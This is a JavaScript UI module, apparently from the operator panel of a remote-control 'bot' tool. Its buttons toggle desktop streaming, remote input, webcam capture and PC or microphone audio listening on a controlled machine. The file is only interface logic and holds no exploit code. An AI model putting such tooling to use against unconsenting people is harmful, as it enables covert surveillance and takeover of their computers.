// frontend/client_control/js/modules/ui/header.js

/* ==========================================================================
   1. КОНФИГУРАЦИЯ И ИНИЦИАЛИЗАЦИЯ (Setup)
========================================================================== */

import { AppState } from '../core/states.js';

export function initHeaderControls() {
    // Карта действий: связываем ID кнопок с состоянием AppState и командами бота
    const actions = [
        { id: 'btn-desktop-stream',  ref: AppState.desktop, key: 'observe', mod: 'ScreenWatch', cmds: ['start_stream', 'stop_stream'] },
        { id: 'btn-desktop-control', ref: AppState.desktop, key: 'control', mod: 'InputForge',  cmds: ['start_control', 'stop_control'] },
        { id: 'btn-webcam-stream',   ref: AppState.webcam,  key: 'active',  mod: 'CamGaze',     cmds: ['start', 'stop'] },
        { id: 'btn-audio-pc',        ref: AppState.audio,   key: 'output',  mod: 'AudioPulse',  cmds: ['listen_pc_on', 'listen_pc_off'] },
        { id: 'btn-audio-mic',       ref: AppState.audio,   key: 'input',   mod: 'AudioPulse',  cmds: ['listen_mic_on', 'listen_mic_off'] }
    ];

    /* ==========================================================================
       2. ЛОГИКА ПЕРЕКЛЮЧЕНИЯ (Toggle Logic)
    ========================================================================== */

    const toggleAction = (action, forceState = null) => {
        const btn = document.getElementById(action.id);
        const newState = (forceState !== null) ? forceState : !action.ref[action.key];

        // 1. Синхронизация состояния и UI кнопки
        action.ref[action.key] = newState;
        if (btn) btn.classList.toggle('active', newState);

        // 2. УПРАВЛЕНИЕ КАНВАСОМ (Слой перехвата ввода)
        // Если переключаем режим управления десктопом, меняем кликабельность канваса
        if (action.id === 'btn-desktop-control') {
            const canvas = document.getElementById('desktopCanvas');
            if (canvas) {
                if (newState) {
                    canvas.classList.add('control-active');
                    console.log("[Header] InputForge activated: Canvas is now intercepting events");
                } else {
                    canvas.classList.remove('control-active');
                    console.log("[Header] InputForge deactivated: Canvas is transparent");
                }
            }
        }

        // 3. Отправка команды через глобальный метод связи
        if (window.sendToBot) {
            window.sendToBot(action.mod, newState ? action.cmds[0] : action.cmds[1]);
        }
    };

    // Вешаем слушатели на все кнопки
    actions.forEach(a => {
        const el = document.getElementById(a.id);
        if (el) el.onclick = () => toggleAction(a);
    });

    /* ==========================================================================
       3. ОРКЕСТРАЦИЯ РЕСУРСОВ (Resource Sync)
    ========================================================================== */

    window.syncModeResources = (mode) => {
        if (mode === 'webcam') {
            if (AppState.desktop.observe) toggleAction(actions[0], false);
            if (AppState.desktop.control) toggleAction(actions[1], false);
        } else if (mode === 'desktop') {
            if (AppState.webcam.active) toggleAction(actions[2], false);
        }
    };
}